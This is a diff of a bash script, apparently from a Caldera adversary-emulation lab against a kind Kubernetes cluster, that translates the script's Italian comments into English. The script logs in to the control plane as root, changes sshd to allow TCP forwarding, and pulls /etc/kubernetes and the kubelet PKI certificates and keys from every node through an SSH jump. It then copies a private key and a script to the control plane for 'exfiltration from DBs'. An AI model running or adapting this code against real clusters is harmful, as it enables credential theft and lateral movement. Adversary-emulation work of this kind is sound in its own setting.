@@ -2,29 +2,28 @@
 set -euo pipefail
 
 # ========== CONFIG ==========
-# Bastion (il solo server raggiungibile dal tuo host)
-BASTION_USER="root"         # utente sul bastion
+# Bastion
+BASTION_USER="root"
 BASTION_HOST="kind-cluster-control-plane"
 BASTION_PORT="122"
-# Target interni (raggiungibili SOLO dal bastion)
-TARGET_USER="root"           # utente sugli interni (se diverso, cambia qui)
+# Internal targets
+TARGET_USER="root"
 TARGET_PORT="122"
 REMOTE_DIR_WORKER="/host/var/lib/kubelet/pki"
 REMOTE_DIR_CP="/host/etc/kubernetes"
-# Chiave privata sul tuo host (usata per bastion e per i target tramite jump)
+
 SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
-# Output locale
 OUT_DIR="$DATA_PATH/KC6/nodes-output"
 
 KUBECONFIG="${KUBECONFIG:-$DATA_PATH/KC6/ops-admin.kubeconfig}"
 HOSTS_FILE="$DATA_PATH/KC6/iphost"
 
 # ========== PRECHECK ==========
-need(){ command -v "$1" >/dev/null 2>&1 || { echo "[-] manca '$1'"; exit 1; }; }
+need(){ command -v "$1" >/dev/null 2>&1 || { echo "[-] missing '$1'"; exit 1; }; }
 need ssh; need tar; need awk; need jq; need kubectl
 
-[[ -f "$SSH_KEY" ]] || { echo "[-] SSH_KEY non trovato: $SSH_KEY"; exit 1; }
-[[ -f "${SSH_KEY}.pub" ]] || { echo "[-] Pub key mancante: ${SSH_KEY}.pub"; exit 1; }
+[[ -f "$SSH_KEY" ]] || { echo "[-] SSH_KEY not found: $SSH_KEY"; exit 1; }
+[[ -f "${SSH_KEY}.pub" ]] || { echo "[-] Pub key missing: ${SSH_KEY}.pub"; exit 1; }
 
 mkdir -p "$OUT_DIR"
 TS="$(date -u +%Y%m%d-%H%M%S)"
@@ -39,20 +38,18 @@ SSH_OPTS=(
   -o IdentitiesOnly=yes
 )
 
-# Usa ProxyCommand, così il salto usa la STESSA chiave e la porta giusta
+# Using ProxyCommand with params
 JUMP_OPTS=(
   -o ProxyCommand="ssh -i $SSH_KEY -p ${BASTION_PORT} -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new -W %h:%p ${BASTION_USER}@${BASTION_HOST}"
 )
 
-# ========== 0) ABILITA FORWARDING SUL BASTION (idempotente) ==========
-echo "[*] Abilito TCP forwarding sul bastion (se serve) e ricarico sshd..."
+# ========== 0) ENABLING FORWARDING ON BASTION ==========
+echo "[*] Enabling TCP forwarding on bastion (if needed) and restart sshd..."
 
-# 0.a) se è già ok, non toccare nulla
 if ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" \
      'sshd -T | grep -q "^allowtcpforwarding yes$" && grep -q "^permitopen any$" <(sshd -T)'; then
-  echo "[=] Forwarding già attivo sul bastion"
+  echo "[=] Forwarding already activ on bastion"
 else
-  # 0.b) applica la config in una sessione separata (può chiudersi quando invii HUP)
   ssh -p "$BASTION_PORT" "${SSH_OPTS[@]}" "${BASTION_USER}@${BASTION_HOST}" 'bash -s' <<'EOSH' || true
 set -e
 conf=/etc/ssh/sshd_config
@@ -78,12 +75,11 @@ AllowAgentForwarding yes
 EOF
 
 /usr/sbin/sshd -t
-# ricarica in modo "amico" (se sshd è PID1, kill -HUP 1; altrimenti pidof)
+# reload
 pid="$(pidof sshd 2>/dev/null || echo 1)"
 kill -HUP "$pid" || true
 EOSH
 
-  # 0.c) verifica in loop che la config sia effettiva
   ok=false
   for i in {1..6}; do
     sleep 0.5
@@ -93,14 +89,14 @@ EOSH
     fi
   done
   if ! $ok; then
-    echo "[-] Impossibile confermare AllowTcpForwarding/PermitOpen sul bastion"; exit 1
+    echo "[-] Impossible to confirm AllowTcpForwarding/PermitOpen on bastion"; exit 1
   fi
-  echo "[+] Forwarding attivo sul bastion"
+  echo "[+] Forwarding activated on bastion"
 fi
 
-# ========== 1) COSTRUISCI HOSTS_FILE (se vuoto) ==========
+# ========== 1) BUILDING HOSTS_FILE (if empty) ==========
 if [[ ! -s "$HOSTS_FILE" ]]; then
-  echo "[i] genero $HOSTS_FILE dai nodi worker"
+  echo "[i] generating $HOSTS_FILE from worker nodes"
   kubectl --kubeconfig "$KUBECONFIG" get nodes -o json \
   | jq -r '.items[]
     | select(.metadata.labels["node-role.kubernetes.io/control-plane"] | not)
@@ -108,7 +104,7 @@ if [[ ! -s "$HOSTS_FILE" ]]; then
   > "$HOSTS_FILE"
 fi
 
-# ========== FUNZIONI ==========
+# ========== FUNCTIONS ==========
 test_ssh() { # $1 user $2 host $3 port [extra...]
   ssh "${SSH_OPTS[@]}" -p "$3" "${@:4}" "$1@$2" 'echo ok' >/dev/null 2>&1 \
     && echo "[+] SSH OK -> $1@$2:$3" || { echo "[-] SSH KO -> $1@$2:$3"; return 1; }
@@ -117,7 +113,7 @@ test_ssh() { # $1 user $2 host $3 port [extra...]
 fetch_dir() { # $1 user $2 host $3 port $4 dest_sub $5 rdir [extra...]
   local user="$1" host="$2" port="$3" dest_sub="$4" rdir="$5"; shift 5
   local dest="${OUT_DIR}/${dest_sub}-${TS}"
-  echo "[*] ${host}: copio '${rdir}' -> ${dest}/"
+  echo "[*] ${host}: copying '${rdir}' -> ${dest}/"
   mkdir -p "$dest"
   local parent base
   parent="$(dirname "$rdir")"; base="$(basename "$rdir")"
@@ -125,17 +121,17 @@ fetch_dir() { # $1 user $2 host $3 port $4 dest_sub $5 rdir [extra...]
     "tar -C \"\$([ -d \"$parent\" ] && echo \"$parent\" || echo /)\" -cpf - \"$base\"" \
     | tar -C "$dest" -xpf - \
     && echo "[+] ${host}: OK -> ${dest}/$base" \
-    || { echo "[-] ${host}: copia FALLITA"; return 1; }
+    || { echo "[-] ${host}: copy FAILED"; return 1; }
 }
 
 # ========== 2) TEST BASTION ==========
 test_ssh "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" || {
-  echo "   Suggerimenti: verifica DS sul control-plane e chiave in authorized_keys"; exit 1; }
+  echo "   Tips: verification DS on control-plane and key in authorized_keys"; exit 1; }
 
-# ========== 3) COPIA DAL BASTION ==========
+# ========== 3) COPY FROM BASTION ==========
 fetch_dir "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" "bastion_${BASTION_HOST}" "$REMOTE_DIR_CP"
 
-# ========== 4) COPIA DAI WORKER (via ProxyCommand) ==========
+# ========== 4) COPY FROM WORKERS (via ProxyCommand) ==========
 if [[ -s "$HOSTS_FILE" ]]; then
   while IFS= read -r line; do
     [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
@@ -143,7 +139,7 @@ if [[ -s "$HOSTS_FILE" ]]; then
     tag="${line#* - }"
     [[ -z "$tag" ]] && tag="$ip"
 
-    # test ssh via jump (così buchi subito eventuali problemi)
+    # test ssh via jump
     if ! test_ssh "$TARGET_USER" "$ip" "$TARGET_PORT" "${SSH_JUMP_OPTS[@]}"; then
       echo "   (skip $ip)"; continue
     fi
@@ -151,7 +147,7 @@ if [[ -s "$HOSTS_FILE" ]]; then
     fetch_dir "$TARGET_USER" "$ip" "$TARGET_PORT" "$tag" "$REMOTE_DIR_WORKER" \
       "${SSH_JUMP_OPTS[@]}"
 
-    # Eseguo l'esfiltrazione dai DBs
+    # Executing exfiltration from DBs
     scp -i "$SSH_KEY" -P 122 "/opt/caldera/KC4/container-admin1.sh" root@kind-cluster-control-plane:/tmp/container-admin1.sh
     scp -i "$SSH_KEY" -P 122 "$SSH_KEY" root@kind-cluster-control-plane:/tmp/key
     ssh -i "$SSH_KEY" -n -p 122 root@kind-cluster-control-plane 'chmod +x /tmp/container-admin1.sh'
@@ -163,7 +159,7 @@ if [[ -s "$HOSTS_FILE" ]]; then
       
   done < "$HOSTS_FILE"
 else
-  echo "[!] HOSTS_FILE vuoto: $HOSTS_FILE"
+  echo "[!] HOSTS_FILE empty: $HOSTS_FILE"
 fi
 
-echo "[✓] Fatto. Output in: $OUT_DIR"
+echo "[✓] Done. Output in: $OUT_DIR"
